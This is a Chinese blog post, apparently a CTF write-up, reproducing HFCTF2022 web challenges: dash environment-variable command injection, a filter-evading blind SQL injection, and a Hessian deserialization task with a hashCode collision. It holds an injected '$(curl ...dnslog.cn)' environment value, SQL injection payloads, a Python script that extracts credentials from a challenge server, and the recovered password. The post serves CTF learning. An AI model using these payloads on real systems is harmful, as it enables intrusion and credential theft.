<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="HFCTF2022坐牢复现高强度坐牢，四个web只会一个最简单的SQL。ezphp跟着p神文章调一天调不通自闭了。日路由器看都不想看，java很有兴趣但能力有限，复现会重点研究 ezphp环境就和p神这篇文章的基本一致，用的nginx服务器，fpm通信是本地端口不是Unix socket，然后对着p神的文章搭了一个远程调试环境搞了好久。刚好把上个星期学codeql下的vscode利用起来了 调试环">
<meta property="og:type" content="article">
<meta property="og:title" content="HFCTF2022坐牢复现">
<meta property="og:url" content="https://blog.z3ratu1.cn/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html">
<meta property="og:site_name" content="Z3ratu1&#39;s blog">
<meta property="og:description" content="HFCTF2022坐牢复现高强度坐牢，四个web只会一个最简单的SQL。ezphp跟着p神文章调一天调不通自闭了。日路由器看都不想看，java很有兴趣但能力有限，复现会重点研究 ezphp环境就和p神这篇文章的基本一致，用的nginx服务器，fpm通信是本地端口不是Unix socket，然后对着p神的文章搭了一个远程调试环境搞了好久。刚好把上个星期学codeql下的vscode利用起来了 调试环">
<meta property="og:locale">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323195947515.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323200132881.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323200813413.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323201104572.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323201331441.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150431540.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150900729.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150933248.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151547353.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151638420.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151944239.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323154700790.png">
<meta property="article:published_time" content="2022-03-20T13:05:05.000Z">
<meta property="article:modified_time" content="2022-03-23T13:06:36.359Z">
<meta property="article:author" content="Z3ratu1">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.z3ratu1.cn/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323195947515.png">

<link rel="canonical" href="https://blog.z3ratu1.cn/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-Hans'
  };
</script>

  <title>HFCTF2022坐牢复现 | Z3ratu1's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Z3ratu1's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
      <meta itemprop="name" content="Z3ratu1">
      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z3ratu1's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HFCTF2022坐牢复现
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-20 21:05:05" itemprop="dateCreated datePublished" datetime="2022-03-20T21:05:05+08:00">2022-03-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-23 21:06:36" itemprop="dateModified" datetime="2022-03-23T21:06:36+08:00">2022-03-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
            </span>

          
            <span id="/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="HFCTF2022坐牢复现" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="HFCTF2022坐牢复现"><a href="#HFCTF2022坐牢复现" class="headerlink" title="HFCTF2022坐牢复现"></a>HFCTF2022坐牢复现</h1><p>高强度坐牢，四个web只会一个最简单的SQL。ezphp跟着p神文章调一天调不通自闭了。日路由器看都不想看，java很有兴趣但能力有限，复现会重点研究</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>环境就和p神这篇<a target="_blank" rel="external nofollow noopener noreferrer" href="https://tttang.com/archive/1450/">文章</a>的基本一致，用的nginx服务器，fpm通信是本地端口不是Unix socket，然后对着p神的文章搭了一个远程调试环境搞了好久。刚好把上个星期学codeql下的vscode利用起来了</p>
<p>调试环境搭建搭完就忘了怎么搞的了，反正最后配这个launch.json文件就行</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>
    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>
            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>
            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>
            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"${workspaceFolder}/bin/dash"</span><span class="token punctuation">,</span>     
            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"-xi"</span><span class="token punctuation">,</span> <span class="token string">"echo hello"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"${workspaceFolder}"</span><span class="token punctuation">,</span>
            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"PS4"</span><span class="token punctuation">,</span>
                    <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"$(curl tfaf1s.dnslog.cn)"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>
            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"为 gdb 启用整齐打印"</span><span class="token punctuation">,</span>
                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>
                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">false</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre>
<p>根据p神的说法，ENV变量需要-i参数才能命令执行，复现成功，而system启用的为<code>sh -c</code>，Debian系sh软链接到dash，下载对应源码编译一个dash调试</p>
<p>除去p神说的ENV，还有三个备选选项PS1&#x2F;2&#x2F;4。分别调一下，先全局搜p神提到的入口函数<code>expandstr</code>，的确能迅速定位到PS系列变量进入了该函数，首先是ps4</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323195947515.png" alt="image-20220323195947515"></p>
<p>然而这里有一个xflag的判断，也就是需要-x</p>
<p>然后是这个<code>getprompt</code>里面有机会对ps1&#x2F;2进expandstr</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323200132881.png" alt="image-20220323200132881"></p>
<p>但是需要看whichprompt的值，跟一下。这玩意是个全局变量，正如p神所言，这里面一把一把的全局变量，goto到还好没怎么见，全局变量满天飞。其在setprompt中赋值，继续追<br>有几个可能，一个是needprompt不为0即赋值为2，该值默认是0，还有一个doprompt，同样不为0时赋值为2</p>
<p>doprompt在parsecmd里初始化，其参数即为doprompt的值，然后找parsecmd的调用点</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323200813413.png" alt="image-20220323200813413"></p>
<p>传入的是inter，默认为0，有iflag的时候++，也就是-i，用不了，<br>还能找到一个赋值点是等于saveprompt，然而这段代码长这样。。</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323201104572.png" alt="image-20220323201104572"></p>
<p>而needprompt除了默认赋值为0外只有一个等于doprompt，也没有用</p>
<p>最终得到的结论是p神这个操作在Debian系下在只有一个-c的情况下全都不能触发。。。至少得-i或者-x。还得是暂且不论无法执行的情况下</p>
<p>即便如此我还调了一下p神说的变量能够解析但命令会报错的问题。psx系列变量的值找定义是一个复杂结构体，直接不想看，没找到赋值是在哪，在调试的时候发现其值一直是定值，并且在某个配置文件里面找到了对应的定值</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323201331441.png" alt="image-20220323201331441"></p>
<p>跟了一下ENV的成功流程，是从expandstr进expandarg进argstr进expbackq，进evalbackcmd进forkshell。然后里面fork了一下成功了。但实际上跟PS4的时候发现在某一步的时候switch case的值就不一样了。然后具体是哪出了问题就没调了。现在有点忘了，好像是argstr函数里出问题了？</p>
<p>最后看他们的解是hxpctf里面那招究极发文件让nginx缓存然后proc访问。env写LD_PRELOAD做到rce。。。这个比赛我打了的来着，但是一时间真没想到这个操作</p>
<p>以及这回文件读都没有，nginx进程就全靠猜。。。也不是不能爆，运气游戏嘛</p>
<h2 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h2><p>是不是叫这个名字来着，忘了，反正这次比赛的名字不是baby就是ez。哈哈</p>
<p>SQL注入，给了个正则表达式的提示，还给了个hint.md的提示（我一开始以为要先打到读文件读这个hint.md。。。。结果是直接访问）</p>
<p>过滤了空格和括号，过滤括号算是大杀器了，然后还有些其他的乱七八糟字符比如<code>\*()</code>之类的，具体有哪些忘了，也过滤了union和binary两个关键字，登录操作是select用户名对应的所有，然后对密码进行一个强比较</p>
<p>提示了用正则就用呗，然后因为不知道密码，无论怎么登录都是401未授权，用户名处塞引号就SQL出错500，那么思路就是整数溢出注入了。直接~0+1急速构造出整数溢出。又因为密码列就在当前表下，直接regexp进行比对即可，对列名用反引号括起来替代空格，写了类似于这样子的payload</p>
<pre><code>&#39;||~0+&#39;^a&#39;regexp`password`&amp;&amp;&#39;1
</code></pre>
<p>但是证书溢出的情况似乎不是很乐观，并没有产生溢出，不知道是不是因为这个奇怪的加法的原因，但不能用括号就不能if，不然就能直接~0+1</p>
<p>然后sql大师znj写了个case的操作完成了这一任务</p>
<pre><code>&#39;||case`password`regexp&#39;^.+$&#39;when&#39;1&#39;then~0+1+&#39;&#39;else&#39;&#39;end&amp;&amp;&#39;1
</code></pre>
<p>写出盲注脚本，得出用户名密码长度和内容</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token comment" spellcheck="true"># user qay8tefyzc67aeoo len 16</span>
<span class="token comment" spellcheck="true"># pass m52fpldxyylb^eizar!8gxh$ len 24</span>
url <span class="token operator">=</span> <span class="token string">"http://47.107.231.226:29514/login"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"'||case`password`regexp'^.{}$'when'1'then~0+1+''else''end&amp;&amp;'1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">break</span>


charset <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz!$&amp;+./:&lt;=>?@^`{|}~"</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"'||case`password`like'{}%'when'1'then~0+1+''else''end&amp;&amp;'1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(data['username'])</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> c
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]result: "</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>
<p>注密码的时候发现密码有特殊字符，就有点难办，毕竟还有过滤，如果特殊字符还是过滤里面的就不好搞了，并且本身正则特殊字符有特殊含义也不好测。然后想起来like这个语句的语法特殊一些，就支持<code>_%</code>两个通配符，就能完整的注出用户名和密码</p>
<p>但是这里还有一个非常严峻的问题，密码没有大小写区分，而最后比对的时候必然区分大小写，题目不让用binary，且正则默认不区分大小写。想用正则的[a-z]这种区间写法但是短横线也不给用，[:upper:]这种语法能给我也把小写匹配上了。。。我当场大无语</p>
<p>然后数了下密码的字母位数，17位。想着要不就爆破算了，打不了跑四五个小时。。。</p>
<p>然后我就先睡了，第二天起来发现队友翻SQL文档翻到了这个collate操作打通了，加上即可</p>
<pre><code>&#39;||case`username`collate&#39;utf8mb4_bin&#39;regexp&#39;^&#123;&#125;&#39;when&#39;1&#39;then~0+1+&#39;&#39;else&#39;&#39;end&amp;&amp;&#39;1
</code></pre>
<p>本地打的时候究极报错utf8mb4_bin和latin1字符集不匹配，然而我整个表的字符集都是utf8mb4来着</p>
<p>后来赛后交流发现他们多或一下写另一个正则语句然后把正则写成错的也行，但需要额外的操作，需要在第一个regexp的开头加一个<code>@tmp:=</code>，这是个啥玩意啊，完全看不懂，搜到的结果是可以替代空格，但是他们加了个这个之后就会导致前面的正则成功后后面的正则不判断了，否则都判断。太抽象了</p>
<blockquote>
<p>@tmp:&#x3D;test只能用在select关键字之后，等号后面的字符串随意</p>
</blockquote>
<p>mysql的或逻辑本来就非常的诡异，并不是从左往右顺序执行的，可能本身和表达式的类型也有关</p>
<h2 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez_chain"></a>ez_chain</h2><p>究极java。给的是一个没见过的全新反序列化。因为最近在学java所以会尽可能的写的详细一点</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>HttpExchange t<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
            String query <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> queryMap <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">queryToMap</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
            String response <span class="token operator">=</span> <span class="token string">"Welcome to HFCTF 2022"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>queryMap <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                String token <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>queryMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                String secret <span class="token operator">=</span> <span class="token string">"HFCTF2022"</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>Objects<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token operator">==</span> secret<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>secret<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    InputStream is <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
                        Hessian2Input input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        response <span class="token operator">=</span> <span class="token string">"oops! something is wrong"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    response <span class="token operator">=</span> <span class="token string">"your token is wrong"</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            t<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            OutputStream os <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<h3 id="过hashCode"><a href="#过hashCode" class="headerlink" title="过hashCode"></a>过hashCode</h3><p>直接碰也不是不行，但实际上java String类的hashCode函数非常的简单，所以可以直接构造一下<img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150431540.png" alt="image-20220323150431540"></p>
<p>初始情况下hash都是0，这个值的作用就是在当前字符串计算过hash之后再次调用不会再算一次。所以只需要将第一个字符-1再将第二个字符+31即可实现一个hash相同的字符串<code>GeCTF2022</code></p>
